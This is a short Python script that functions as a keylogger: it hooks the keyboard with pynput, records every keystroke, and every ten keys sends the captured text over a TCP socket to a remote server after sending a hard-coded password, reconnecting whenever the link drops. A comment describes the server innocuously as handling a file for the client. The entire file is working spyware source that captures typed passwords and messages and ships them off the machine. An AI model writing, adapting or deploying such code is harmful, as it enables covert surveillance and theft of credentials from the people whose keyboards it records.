import socket
import threading
from pynput.keyboard import Key, Listener


# constants
count = 0
keys = []
PORT = 5050
SERVER = '0.0.0.0'
FORMAT = 'utf-8'
ADDR = (SERVER, PORT)
PASSWORD = 'BuzzKill5678'


# used to sign into remote server to handle file for client
def sign_in():
    global client

    print('Connecting')
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        client.connect(ADDR)
        client.send(PASSWORD.encode(FORMAT))
        print('Connection established')
    except ConnectionRefusedError:
        print('Connection refused...')
        sign_in()
    except TimeoutError:
        print('Timeout...')
        sign_in()


# sends data log to server
def send_log(content):
    content= ''.join(content)
    try:
        client.send(content.encode(FORMAT))
    except ConnectionResetError:
        sign_in()
        send_log(content)
    except ConnectionAbortedError:
        sign_in()
        send_log(content)
    finally:
        pass


# records the push of each key
def on_press(key):
    global keys, count

    key = str(key).replace("'", '')
    key = str(key).replace('Key.space', ' ')
    key = str(key).replace('Key.enter', '\n')
    key = str(key).replace('Key.backspace', '\b')

    keys.append(key)
    count += 1

    if count >= 10:
        thread = threading.Thread(target=send_log, args=(keys,))
        thread.start()
        keys = []
        count = 0


thread = threading.Thread(target=sign_in)
thread.start()


def on_release(key):
    if key == Key.esc:
        return False


def run():
    try:
        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except ConnectionResetError:
        sign_in()
        run()


run()
